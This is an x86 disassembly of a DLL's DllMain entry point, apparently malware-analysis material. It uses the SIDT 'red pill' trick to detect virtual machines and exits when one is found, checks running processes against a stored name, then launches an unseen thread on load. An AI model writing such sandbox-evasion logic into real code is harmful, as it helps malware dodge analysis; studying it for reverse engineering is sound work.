; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)

_DllMain@12 proc near
    push    ebp
    mov     ebp, esp
    sub     esp, 130h
    push    edi
    sidt    fword ptr [ebp-8]
    mov     eax, [ebp-6]
    cmp     eax, 8003F400h
    jbe     short loc_10001C88
    cmp     eax, 80047400h
    jnb     short loc_10001C88
    xor     eax, eax
    pop     edi
    mov     esp, ebp
    pop     ebp
    retn    0Ch
loc_10001C88:
    xor     eax, eax
    mov     ecx, 49h
    lea     edi, [ebp-12Ch]
    mov     dword ptr [ebp-130h], 0
    push    eax
    push    2
    rep     stosd
    call    CreateToolhelp32Snapshot
    mov     edi, eax
    cmp     edi, 0FFFFFFFFh
    jnz     short loc_10001CB9
    xor     eax, eax
    pop     edi
    mov     esp, ebp
    pop     ebp
    retn    0Ch
loc_10001CB9:
    lea     eax, [ebp-130h]
    push    esi
    push    eax
    push    edi
    mov     dword ptr [ebp-130h], 128h
    call    Process32First
    test    eax, eax
    jz      short loc_10001D24
    mov     esi, ds:_stricmp
    lea     ecx, [ebp-10Ch]
    push    10007C50h
    push    ecx
    call    esi
    add     esp, 8
    test    eax, eax
    jz      short loc_10001D16
loc_10001CF0:
    lea     edx, [ebp-130h]
    push    edx
    push    edi
    call    Process32Next
    test    eax, eax
    jz      short loc_10001D24
    lea     eax, [ebp-10Ch]
    push    10007C50h
    push    eax
    call    esi
    add     esp, 8
    test    eax, eax
    jnz     short loc_10001CF0
loc_10001D16:
    mov     eax, [ebp-118h]
    mov     ecx, [ebp-128h]
    jmp     short loc_10001D2A
loc_10001D24:
    mov     eax, [ebp+0Ch]
    mov     ecx, [ebp+0Ch]
loc_10001D2A:
    cmp     eax, ecx
    pop     esi
    jnz     short loc_10001D38
    xor     eax, eax
    pop     edi
    mov     esp, ebp
    pop     ebp
    retn    0Ch
loc_10001D38:
    mov     eax, [ebp+0Ch]
    dec     eax
    jnz     short loc_10001D53
    push    0
    push    0
    push    0
    push    100032D0h
    push    0
    push    0
    call    ds:CreateThread
loc_10001D53:
    mov     eax, 1
    pop     edi
    mov     esp, ebp
    pop     ebp
    retn    0Ch
_DllMain@12 endp
